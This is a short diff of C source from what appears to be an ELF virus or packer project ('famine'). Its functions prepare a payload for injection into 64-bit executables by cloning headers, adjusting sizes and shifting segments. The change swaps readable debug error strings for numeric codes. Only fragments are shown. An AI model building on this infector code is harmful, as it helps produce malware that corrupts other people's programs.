@@ -21,7 +21,7 @@ static bool	change_entry(const struct safe_pointer info,
 	Elf64_Ehdr	*clone_hdr = safe(0, sizeof(Elf64_Ehdr));
 
 #ifdef DEBUG
-	char	e[] = {'w','i','l','d','l','y',' ','u','n','r','e','a','s','o','n','a','b','l','e','\0'};
+	char	e[] = {'7','1','\0'};
 #endif
 	if (!clone_hdr)  return errors(ERR_CORRUPT, e);
 
@@ -46,7 +46,7 @@ static bool	adjust_sizes(const struct endians_pointer endians,
 	const size_t	payload_size = _start - famine_entry;
 
 #ifdef DEBUG
-	char e[] = {'a','d','j','u','s','t','_','s','i','z','e','s','\0'};
+	char e[] = {'7','2','\0'};
 #endif
 	if (!find_entry(&clone_entry, info, endians)) return errors(ERR_THROW, e);
 
@@ -88,7 +88,7 @@ static bool	define_shift_amount(const struct endians_pointer endians,
 	const size_t	end_padding = (p_memsz % p_align) + *shift_amount;
 
 #ifdef DEBUG
-	char	e[] = {'i','n','s','u','f','f','i','c','i','e','n','t',' ','m','e','m','o','r','y',' ','p','a','d','d','i','n','g','\0'};
+	char	e[] = {'7','3','\0'};
 #endif
 	if (end_padding > p_align)
 		return errors(ERR_USAGE, e);
@@ -102,7 +102,7 @@ bool		elf64_packer(const struct famine food, size_t original_file_size)
 	size_t		shift_amount;
 
 #ifdef DEBUG
-	char e[] = {'e','l','f','6','4','_','p','a','c','k','e','r','\0'};
+	char e[] = {'7','4','\0'};
 #endif
 	if (!find_entry(&original_entry, food.original_safe, food.endians)
 	|| !define_shift_amount(food.endians, &original_entry, &shift_amount)
